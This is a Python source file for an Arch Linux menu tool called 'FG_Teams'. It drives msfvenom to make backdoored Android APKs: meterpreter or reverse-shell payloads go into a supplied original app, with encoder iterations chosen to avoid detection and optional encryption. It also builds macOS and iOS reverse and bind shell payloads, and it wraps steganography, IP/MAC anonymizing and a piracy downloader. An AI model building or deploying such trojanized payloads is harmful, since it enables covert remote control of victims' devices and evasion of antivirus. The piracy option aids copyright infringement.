import sys
import time
import os
import subprocess
import urllib.request as ur
import socket

import requests
from colorama import Fore

# note there is too many things pending in this software it will be updated soon


script_version = '1.3.3'


# <---main-menu--->
menu = """
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [1] Android                    |       [7] IOS         ️                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [2] Windows                    |       [8] phishing                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [3] steganography              |       [9] Piracy                        ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [4] Mac OS                     |       [10] Spoofing                     ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [5] Backdoors with msfvenom    |       [11] More                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [6] Ghostnet    ️               |       [0] Exit                          ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <-- next-menu -->

next_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [12] Web-attacks               |       [18] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [13] wifi-attacks              |       [19] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [14] coming soon               |       [20] coming soon                  ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [15] coming soon               |       [21] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [16] coming soon               |       [22] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [17] coming soon               |       [00] Exit                         ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <----logo---->
banner = f"""
|̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ |
| ███████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░██████╗ |
| ██╔════╝██╔════╝░╚══██╔══╝██╔════╝██╔══██╗████╗░████║██╔════╝ |
| █████╗░░██║░░██╗░░░░██║░░░█████╗░░███████║██╔████╔██║╚█████╗░ |
| ██╔══╝░░██║░░╚██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░╚═══██╗ |
| ██║░░░░░╚██████╔╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██████╔╝ |
| ╚═╝░░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░ |
|_______________________________________________________________|
| im not responsible for any misuse of this software, Thanks ❤  |
|_______________________________________________________________|
note : Buy me a coffee https://paypal.me/furjack
version = {script_version}
"""

# <----starting with a clear empty screen----->
os.system('clear')


# <---Functions--->
def showIp():
    host_name = socket.gethostname()
    Ip_Adress = socket.gethostbyname(host_name)

    print("\n[+] IP: " + Ip_Adress)

    myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']

    print("\n[+] Public IP: " + myip)


def options():
    global ipf, portf, outputf, iteratef
    print('your ip is\n')
    showIp()
    ipf = input('\nEnter your ip for LHOST: ')
    portf = input('\nEnter your port for LPORT: ')
    outputf = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iteratef = input('\nHow much time to increase the iteration of encoder from non detection: ')


def option_xp():
    global loc, ip, port, output, iterate
    print('your ip is')
    showIp()
    loc = input('\nEnter the location of apk: ')
    ip = input('\nEnter your ip for LHOST: ')
    port = input('\nEnter your port for LPORT: ')
    output = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iterate = input('\nHow much time to increase the iteration of encoder from non detection: ')


def encryption():
    global enc
    os.system('clear')
    print(Fore.BLUE, banner)
    print('plz select encryption')
    print('\n\n1. aes256')
    print('\n2. base64')
    print('\n3. rc4')
    print('\n4. xor')

    lock = input('\n\nEnter the encryption (default=3): ')

    if lock == '1':
        enc = 'aes256'
    elif lock == '2':
        enc = 'base64'
    elif lock == '3':
        enc = 'rc4'
    elif lock == '4':
        enc = 'xor'
    elif lock == '':
        enc = 'rc4'
    else:
        print('invalid argument exiting')
        sys.exit(0)


def encoders():
    global e
    os.system('clear')
    print(Fore.BLUE, banner)
    print('plz select encoders')
    print('\n\n1. cmd/brace')
    print('\n2. cmd/echo')
    print('\n3. cmd/generic_sh')
    print('\n4. cmd/ifs')
    print('\n5. cmd/perl')
    print('\n6. cmd/powershell_base64')
    print('\n7. cmd/printf_php_mq')
    print('\n8. generic/eicar')
    print('\n9. generic/none')
    print('\n10. mipsbe/byte_xori')
    print('\n11. mipsbe/longxor')
    print('\n12. mipsle/byte_xori')
    print('\n13. mipsle/longxor')
    print('\n14. php/base64')
    print('\n15. ppc/longxor')
    print('\n16. ppc/longxor_tag')
    print('\n17. ruby/base64')
    print('\n18. sparc/longxor_tag')
    print('\n19. x64/xor')
    print('\n20. x64/xor_context')
    print('\n21. x64/xor_dynamic')
    print('\n22. x64/zutto_dekiru')
    print('\n23. x86/add_sub')
    print('\n24. x86/alpha_mixed')
    print('\n25. x86/alpha_upper')
    print('\n26. x86/avoid_underscore_tolower')
    print('\n27. x86/avoid_utf8_tolower')
    print('\n28. x86/bloxor')
    print('\n29. x86/bmp_polyglot')
    print('\n30. x86/call4_dword_xor')
    print('\n31. x86/context_cpuid')
    print('\n32. x86/context_stat')
    print('\n33. x86/context_time')
    print('\n34. x86/countdown')
    print('\n35. x86/fnstenv_mov')
    print('\n36. x86/jmp_call_additive')
    print('\n37. x86/nonalpha')
    print('\n38. x86/nonupper')
    print('\n39. x86/opt_sub')
    print('\n40. x86/service')
    print('\n41. x86/shikata_ga_nai')
    print('\n42. x86/single_static_bit')
    print('\n43. x86/unicode_mixed')
    print('\n44. x86/unicode_upper')
    print('\n45. x86/xor_dynamic')

    encoder = input('\nselect encoder (default=41): ')
    # <----Reading the user input---->
    if encoder == '1':
        e = 'cmd/brace'
    elif encoder == '2':
        e = 'cmd/echo'
    elif encoder == '3':
        e = 'cmd/generic_sh'
    elif encoder == '4':
        e = 'cmd/ifs'
    elif encoder == '5':
        e = 'cmd/perl'
    elif encoder == '6':
        e = 'cmd/powershell_base64'
    elif encoder == '7':
        e = 'cmd/printf_php_mq'
    elif encoder == '8':
        e = 'generic/eicar'
    elif encoder == '9':
        e = 'generic/none'
    elif encoder == '10':
        e = 'mipsbe/byte_xori'
    elif encoder == '11':
        e = 'mipsbe/longxor'
    elif encoder == '12':
        e = 'mipsle/byte_xori'
    elif encoder == '13':
        e = 'mipsle/longxor'
    elif encoder == '14':
        e = 'php/base64'
    elif encoder == '15':
        e = 'ppc/longxor'
    elif encoder == '16':
        e = 'ppc/longxor_tag'
    elif encoder == '17':
        e = 'ruby/base64'
    elif encoder == '18':
        e = 'sparc/longxor_tag'
    elif encoder == '19':
        e = 'x64/xor'
    elif encoder == '20':
        e = 'x64/xor_context'
    elif encoder == '21':
        e = 'x64/xor_dynamic'
    elif encoder == '22':
        e = 'x64/zutto_dekiru'
    elif encoder == '23':
        e = 'x86/add_sub'
    elif encoder == '24':
        e = 'x86/alpha_mixed'
    elif encoder == '25':
        e = 'x86/alpha_upper'
    elif encoder == '26':
        e = 'x86/avoid_underscore_tolower'
    elif encoder == '27':
        e = 'x86/avoid_utf8_tolower'
    elif encoder == '28':
        e = 'x86/bloxor'
    elif encoder == '29':
        e = 'x86/bmp_polyglot'
    elif encoder == '30':
        e = 'x86/call4_dword_xor'
    elif encoder == '31':
        e = 'x86/context_cpuid'
    elif encoder == '32':
        e = 'x86/context_stat'
    elif encoder == '33':
        e = 'x86/context_time'
    elif encoder == '34':
        e = 'x86/countdown'
    elif encoder == '35':
        e = 'x86/fnstenv_mov'
    elif encoder == '36':
        e = 'x86/jmp_call_additive'
    elif encoder == '37':
        e = 'x86/nonalpha'
    elif encoder == '38':
        e = 'x86/nonupper'
    elif encoder == '39':
        e = 'x86/opt_sub'
    elif encoder == '40':
        e = 'x86/service'
    elif encoder == '41':
        e = 'x86/shikata_ga_nai'
    elif encoder == '42':
        e = 'x86/single_static_bit'
    elif encoder == '43':
        e = 'x86/unicode_mixed'
    elif encoder == '44':
        e = 'x86/unicode_upper'
    elif encoder == '45':
        e = 'x86/xor_dynamic'
    elif encoder == '':
        e = 'x86/shikata_ga_nai'
    else:
        print('invalid argument exiting')
        sys.exit()


def payloads():
    global pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. android/meterpreter_reverse_https')
    print('\n2. android/meterpreter/reverse_https')
    print('\n3. android/meterpreter_reverse_http')
    print('\n4. android/meterpreter/reverse_http')
    print('\n5. android/meterpreter_reverse_tcp')
    print('\n6. android/meterpreter/reverse_tcp')
    print('\n7. android/shell/reverse_https')
    print('\n8. android/shell/reverse_http')
    print('\n9. android/shell/reverse_tcp')

    payload = input('\n\n\nEnter (default=6):')
    # <----Reading the user input---->
    if payload == '1':
        pa = 'android/meterpreter_reverse_https'
    elif payload == '2':
        pa = 'android/meterpreter/reverse_https'
    elif payload == '3':
        pa = 'android/meterpreter_reverse_http'
    elif payload == '4':
        pa = 'android/meterpreter/reverse_http'
    elif payload == '5':
        pa = 'android/meterpreter_reverse_tcp'
    elif payload == '6':
        pa = 'android/meterpreter/reverse_tcp'
    elif payload == '7':
        pa = 'android/shell/reverse_https'
    elif payload == '8':
        pa = 'android/shell/reverse_http'
    elif payload == '9':
        pa = 'android/shell/reverse_tcp'
    elif payload == '':
        pa = 'android/meterpreter/reverse_tcp'
    else:
        print('invalid argument exiting')
        sys.exit()


def payloads_x_e():
    global p
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. android/meterpreter/reverse_https')
    print('\n2. android/meterpreter/reverse_http')
    print('\n3. android/meterpreter/reverse_tcp')
    print('\n4. android/shell/reverse_https')
    print('\n5. android/shell/reverse_http')
    print('\n6. android/shell/reverse_tcp')

    payload = input('\n\n\nEnter (default=6):')
    # <----Reading the user input---->
    if payload == '1':
        p = 'android/meterpreter/reverse_https'
    elif payload == '2':
        p = 'android/meterpreter/reverse_http'
    elif payload == '3':
        p = 'android/meterpreter/reverse_tcp'
    elif payload == '4':
        p = 'android/shell/reverse_https'
    elif payload == '5':
        p = 'android/shell/reverse_http'
    elif payload == '6':
        p = 'android/shell/reverse_tcp'
    elif payload == '':
        p = 'android/meterpreter/reverse_tcp'
    else:
        print('invalid argument exiting')
        sys.exit()


def msfvenom_x():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' -i ' + str(iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_p():
    os.system('clear')
    print(Fore.BLUE, banner)
    options()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom --arch dalvik --platform android -p ' + str(pa) + ' LHOST=' + str(ipf) + ' LPORT=' + str(
        portf) + ' --encoder ' + str(e) + ' -i ' + str(iteratef) + ' -o ' + str(os.getcwd()) + '/payload-apps/' + str(
        outputf))

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_encrypt():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    encryption()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' --encrypt ' + str(enc) + ' -i ' + str(
        iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


# <----functions of main menu---->
def Android():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload (main activity.apk)')
    print('\n3. encrypted backdoor payload')

    ist = input('\n\n\nEnter (default=0): ')

    if ist == "0":
        sys.exit()

    elif ist == "1":
        msfvenom_x()
        print('your payload is successfully created and stored in ../payload-apps/')

    elif ist == "2":
        msfvenom_p()
        print('your payload is successfully created and stored in ../payload-apps/')

    elif ist == "3":
        msfvenom_encrypt()
        print('your payload is successfully created and stored in ../payload-apps/')

    else:
        print('invalid argument exiting')
        sys.exit()


def Windows():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload')
    print('\n3. encrypted backdoor payload')


def Steganography_extract():
    os.system('clear')
    print(Fore.BLUE, banner)
    extract = input('\nEnter the path to stegofile: ')
    os.system('steghide extract -sf ' + str(extract) + ' -v')


def Steganography_Info():
    os.system('clear')
    print(Fore.BLUE, banner)
    stego = input('\nEnter the path to stegofile: ')
    os.system('steghide --info ' + str(stego))


def Steganography_hide():
    os.system('clear')
    print(Fore.BLUE, banner)
    img = input('\n\nEnter the path of cover file: ')
    secret = input('\nEnter the path of .txt(secret file) file: ')
    compress = input('\nwould u like to compress the file (y/n): ').lower()
    passw = input('\nCreate password: ')

    if compress == 'y':
        compress_level = input('\nEnter compression between 1-9: ')
        compression = '-z ' + str(compress_level)
    elif compress == '':
        compress_level = input('\nEnter compression between 1-9: ')
        compression = '-z ' + str(compress_level)
    else:
        compression = '-Z'
    print('\nYour stegofile is being created be patient')
    os.system('steghide embed -cf ' + str(img) + ' -ef ' + str(secret) + ' -p ' + str(
        passw) + ' -sf stegimg.jpg ' + str(compression))


def Steganography():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n1. hide data in a file')
    print('\n2.Extract data of a stegofile')
    print('\n3.Info of a stegofile')
    stego_option = input('\n\n\nFG_Teams: ')

    if stego_option == '1':
        Steganography_hide()
    elif stego_option == '2':
        Steganography_extract()
    elif stego_option == '3':
        Steganography_Info()
    else:
        print('invalid argument exiting')
        sys.exit()


def armor():
    os.system('clear')
    rc = subprocess.call(['which', 'armor'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc != 0:
        print('[*] Installing the tool needed for mac payload generator')
        subprocess.call(['yes | pacman -S armor'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
        print('[*] Installed the armor tool By tokyoneon')
    print('[*] creating payload.txt')
    print('Note if it asks anything to install make sure to install and run FG_Teams again')
    os.system('echo -e "openssl aes-256-cbc -a -salt -in test.txt -out test.txt -k password"> payload.txt')
    mac_ip = input('enter ur ip: ')
    mac_port = input('enter port: ')
    print('creating payload using the armor')
    os.system('armor payload.txt ' + str(mac_ip) + ' ' + str(mac_port))


def mac_payloads():
    global osx_pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. osx/ppc/shell/bind_tcp')
    print('\n2. osx/ppc/shell/find_tag')
    print('\n3. osx/ppc/shell/reverse_tcp')
    print('\n4. osx/ppc/shell_bind_tcp')
    print('\n5. osx/ppc/shell_reverse_tcp')
    print('\n6. osx/x64/dupandexecve/bind_tcp')
    print('\n7. osx/x64/dupandexecve/reverse_tcp')
    print('\n8. osx/x64/dupandexecve/reverse_tcp_uuid')
    print('\n9. osx/x64/exec')
    print('\n10. osx/x64/meterpreter/bind_tcp')
    print('\n11. osx/x64/meterpreter/reverse_tcp')
    print('\n12. osx/x64/meterpreter/reverse_tcp_uuid')
    print('\n13. osx/x64/meterpreter_reverse_http')
    print('\n14. osx/x64/meterpreter_reverse_https')
    print('\n15. osx/x64/meterpreter_reverse_tcp')
    print('\n16. osx/x64/say')
    print('\n17. osx/x64/shell_bind_tcp')
    print('\n18. osx/x64/shell_find_tag')
    print('\n19. osx/x64/shell_reverse_tcp')
    print('\n20. osx/x86/bundleinject/bind_tcp')
    print('\n21. osx/x86/bundleinject/reverse_tcp')
    print('\n22. osx/x86/exec')
    print('\n23. osx/x86/isight/bind_tcp')
    print('\n24. osx/x86/isight/reverse_tcp')
    print('\n25. osx/x86/shell_bind_tcp')
    print('\n26. osx/x86/shell_find_port')
    print('\n27. osx/x86/shell_reverse_tcp')
    print('\n28. osx/x86/vforkshell/bind_tcp')
    print('\n29. osx/x86/vforkshell/reverse_tcp')
    print('\n30. osx/x86/vforkshell_bind_tcp')
    print('\n31. osx/x86/vforkshell_reverse_tcp')

    osx_payload = input('\n\n\nEnter (default=6):')
    if osx_payload == '1':
        osx_pa = 'osx/ppc/shell/bind_tcp'
    elif osx_payload == '2':
        osx_pa = 'osx/ppc/shell/find_tag'
    elif osx_payload == '3':
        osx_pa = 'osx/ppc/shell/reverse_tcp'
    elif osx_payload == '4':
        osx_pa = 'osx/ppc/shell_bind_tcp'
    elif osx_payload == '5':
        osx_pa = 'osx/ppc/shell_reverse_tcp'
    elif osx_payload == '6':
        osx_pa = 'osx/x64/dupandexecve/bind_tcp'
    elif osx_payload == '7':
        osx_pa = 'osx/x64/dupandexecve/reverse_tcp'
    elif osx_payload == '8':
        osx_pa = 'osx/x64/dupandexecve/reverse_tcp_uuid'
    elif osx_payload == '9':
        osx_pa = 'osx/x64/exec'
    elif osx_payload == '10':
        osx_pa = 'osx/x64/meterpreter/bind_tcp'
    elif osx_payload == '11':
        osx_pa = 'osx/x64/meterpreter/reverse_tcp'
    elif osx_payload == '12':
        osx_pa = 'osx/x64/meterpreter/reverse_tcp_uuid'
    elif osx_payload == '13':
        osx_pa = 'osx/x64/meterpreter_reverse_http'
    elif osx_payload == '14':
        osx_pa = 'osx/x64/meterpreter_reverse_https'
    elif osx_payload == '15':
        osx_pa = 'osx/x64/meterpreter_reverse_tcp'
    elif osx_payload == '16':
        osx_pa = 'osx/x64/say'
    elif osx_payload == '17':
        osx_pa = 'osx/x64/shell_bind_tcp'
    elif osx_payload == '18':
        osx_pa = 'osx/x64/shell_find_tage'
    elif osx_payload == '19':
        osx_pa = 'osx/x64/shell_reverse_tcp'
    elif osx_payload == '20':
        osx_pa = 'osx/x86/bundleinject/bind_tcp'
    elif osx_payload == '21':
        osx_pa = 'osx/x86/bundleinject/reverse_tcp'
    elif osx_payload == '22':
        osx_pa = 'osx/x86/exec'
    elif osx_payload == '23':
        osx_pa = 'osx/x86/isight/bind_tcp'
    elif osx_payload == '24':
        osx_pa = 'osx/x86/isight/reverse_tcp'
    elif osx_payload == '25':
        osx_pa = 'osx/x86/shell_bind_tcp'
    elif osx_payload == '26':
        osx_pa = 'osx/x86/shell_find_port'
    elif osx_payload == '27':
        osx_pa = 'osx/x86/shell_reverse_tcp'
    elif osx_payload == '28':
        osx_pa = 'osx/x86/vforkshell/bind_tcp'
    elif osx_payload == '29':
        osx_pa = 'osx/x86/vforkshell/reverse_tcp'
    elif osx_payload == '30':
        osx_pa = 'osx/x86/vforkshell_bind_tcp'
    elif osx_payload == '31':
        osx_pa = 'osx/x86/vforkshell_reverse_tcp'
    elif osx_payload == '':
        osx_pa = 'osx/x64/meterpreter/reverse_tcp'
    else:
        print('invalid argument exiting')
        sys.exit()


def mac_payload():
    os.system('clear')
    osx_ip = input('\nEnter ur Ip: ')
    osx_port = input('\nEnter Port: ')
    osx_output = input('Enter the output file name: ')
    mac_payloads()
    os.system('msfvenom -p ' + str(osx_pa) + ' LHOST=' + str(osx_ip) + ' LPORT=' + str(osx_port) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(osx_output) + ' -f macho --platform osx')



def choose():
    os.system('clear')
    print('\nChoose the option')
    print('\n1. armor [netcat listener by tokyoneon]')
    print('\n2. mac os payload with all payloads available in metasploit')
    ch = input('\n\n\nFG_Teams: ')
    if ch == '1':
        armor()
    elif ch == '2':
        mac_payload()
    elif ch == '':
        mac_payload()
    else:
        print('invalid argument exiting')
        sys.exit()


def Mac():
    os.system('clear')
    print(Fore.BLUE, banner)
    choose()




def Backdoors():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')


def Ghostnet():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\nA special thanks for mach1el to create this tool ghostnet')
    print('\nGhostnet is tool to anonymize your ip and mac address it changes randomly every minutes')
    print('\n1. Start')
    print('\n2. Stop')
    print('\n3. Status')

    g = input('\n\nghostnet: ')

    if g == '1':
        os.system('ghostnet start')
    elif g == '2':
        os.system('ghostnet stop')
    elif g == '3':
        os.system('ghostnet status')
    elif g == '':
        os.system('ghostnet')
    else:
        print('invalid argument exiting')
        sys.exit()


def More():
    os.system('clear')
    print(Fore.BLUE, banner)
    print(next_menu)


def coming_soon():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\ncoming soon under development Thanks for using this tool')
    sys.exit()


def ios_payloads():
    global ios_pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. osx/armle/shell_reverse_tcp.rb')
    print('\n2. osx/armle/execute/bind_tcp')
    print('\n3. osx/armle/execute/reverse_tcp')
    print('\n4. osx/armle/shell/bind_tcp')
    print('\n5. osx/armle/shell/reverse_tcp')
    print('\n6. osx/armle/shell_bind_tcp')
    print('\n7. osx/armle/shell_reverse_tcp')
    print('\n8. osx/armle/vibrate')

    ipayload = input('\n\n\nEnter (default=6):')
    if ipayload == '1':
        ios_pa = 'osx/armle/shell_reverse_tcp.rb'
    elif ipayload == '2':
        ios_pa = 'osx/armle/execute/bind_tcp'
    elif ipayload == '3':
        ios_pa = 'osx/armle/execute/reverse_tcp'
    elif ipayload == '4':
        ios_pa = 'osx/armle/shell/bind_tcp'
    elif ipayload == '5':
        ios_pa = 'osx/armle/shell/reverse_tcp'
    elif ipayload == '6':
        ios_pa = 'osx/armle/shell_bind_tcp'
    elif ipayload == '7':
        ios_pa = 'osx/armle/shell_reverse_tcp'
    elif ipayload == '8':
        ios_pa = 'osx/armle/vibrate'
    elif ipayload == '':
        ios_pa = 'osx/armle/shell_reverse_tcp.rb'
    else:
        print('invalid argument exiting')
        sys.exit()


def IOS():
    os.system('clear')
    print(Fore.BLUE, banner)
    ios_ip = input('\nEnter ur Ip: ')
    ios_port = input('\nEnter Port: ')
    ios_output = input('Enter the output file name: ')
    ios_payloads()
    os.system('msfvenom -p '+ str(ios_pa) +' LHOST='+ str(ios_ip) +' LPORT='+str(ios_port)+' -o ' + str(os.getcwd()) + '/payload-apps/'+ str(ios_output) +' -f macho -a armle --platform osx')
    print('after this convert ur output file to deb and run it on apple phones')


def Piracy():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n\n1. movie download')
    print('\n2. game download')
    print('\n3. repacked game download')
    print('\n4. books download')

    pc = input('FG_Teams: ')

    if pc == '1':
        os.system('fg_movies')
    elif pc == '2':
        coming_soon()
    elif pc == '3':
        coming_soon()
    elif pc == '':
        os.system('fg_movies')
    else:
        print('invalid argument exiting')
        sys.exit()


def Others():
    ...


# <---main--->
def main():
    os.system('clear')
    print(Fore.BLUE, banner)

    print(menu)

    me = input('\n\nSelect your option: ')

    if me == '1':
        Android()
    elif me == '2':
        Windows()
    elif me == '3':
        Steganography()
    elif me == '4':
        Mac()
    elif me == '5':
        Backdoors()
    elif me == '6':
        Ghostnet()
    elif me == '7':
        coming_soon()
    elif me == '8':
        coming_soon()
    elif me == '9':
        Piracy()
    elif me == '10':
        coming_soon()
    elif me == '11':
        More()
    elif me == '0':
        sys.exit(0)
    else:
        print('invalid argument exiting')
        sys.exit()


# <----Checking root---->
def check_root():
    if os.geteuid() != 0:
        exit("You need to have root privileges to create payload.\ntry again using sudo")


def check_os():
    os = subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if os != 0:
        print('This distro or os is not supported this framework is only for arch! thanks')
        sys.exit(0)


def check_connection():
    try:
        ur.urlopen('https://google.com/')
        return True
    except OSError:
        print('Please connect to internet')
        print('without internet the tool wont work to install modules')
        sys.exit()


# <--all needed modules for payload creation-->
def installer():
    print(Fore.BLUE, banner)

    print("Checking for the needed modules")

    # nyx tor macchanger
    rc = subprocess.call(['which', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('tor is installed ✔')
    else:
        print('tor and related tools are not installed \ninstalling')
        subprocess.call(['yes | pacman -S nyx macchanger tor gnu-netcat socat bleachbit'], shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # black-arch tools
    # ba = input('would you like to install all blackarch tools its almost 15gb (Y/n): ').lower()
    # if ba == 'y':
    #     print('This is under development')
    # else:
    #     pass

    # Steghide
    rc = subprocess.call(['which', 'steghide'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('steghide is installed! ✔️')
    else:
        print('steghide is not installed \ninstalling')
        subprocess.call(['yes | pacman -S steghide'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # fg_movies
    rc = subprocess.call(['which', 'fg_movies'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('fg_movies is installed! ✔️')
    else:
        print('fg_movies is not installed \ninstalling')
        subprocess.call(['chmod +x ' + str(os.getcwd()) + '/fg_movies '], shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        subprocess.call(['mv ' + str(os.getcwd()) + '/fg_movies ' + str(os.getcwd()) + '/ad.crx /usr/bin/'],
                        shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # xterm
    rc = subprocess.call(['which', 'xterm'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('xterm is installed! ✔️')
    else:
        print('xterm is not installed \ninstalling')
        subprocess.call(['yes | pacman -S xterm'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # postgresql
    rc = subprocess.call(['which', 'psql'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('postgresql is intsalled')
    else:
        print('postgresql is not installed \ninstalling')
        subprocess.call(['yes | pacman -S postgresql'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # Apktool
    rc = subprocess.call(['which', 'apktool'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('apktool is installed! ✔️')
    else:
        print('apktool not installed \ninstalling')
        subprocess.call(['chmod +x ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar'], shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        subprocess.call(['mv ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar /usr/bin/'],
                        shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # Zipalign
    zp = subprocess.call(['which', 'zipalign'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if zp == 0:
        print('zipalign is installed! ✔️')
    else:
        print('zipalign is not installed! \ninstalling zipalign')
        subprocess.call(['yes | pacman -S android-sdk-build-tools'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # apksigner
    jr = subprocess.call(['which', 'apksigner'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jr == 0:
        print("apksigner is installed! ✔️")
    else:
        print('apksigner is not installed ! \ninstalling jarsigner')
        subprocess.call(['yes | pacman -S android-sdk-build-tools'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # Msfvenom, metasploit
    ms = subprocess.call(['which', 'msfvenom'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if ms == 0:
        print('msfvenom is installed! ✔️')
    else:
        print('metasploit is not installed! \nInstalling Metasploit')
        subprocess.call(['yes | pacman -S metasploit'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    # Java
    jdk = subprocess.call(['which', 'java'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jdk == 0:
        print('open-jdk installed! ✔️')
    else:
        print('installing java')
        subprocess.call(['yes | pacman -S jdk-openjdk java-environment-common jre-openjdk'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # ghostnet
    gh = subprocess.call(['which', 'ghostnet'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if gh == 0:
        print('ghostnet is installed ✔️')
    else:
        print('ghostnet is not installed! \ninstalling')
        os.system('chmod +x ghostnet && mv ghostnet /usr/bin/ && mv ghostnet.log /opt/')

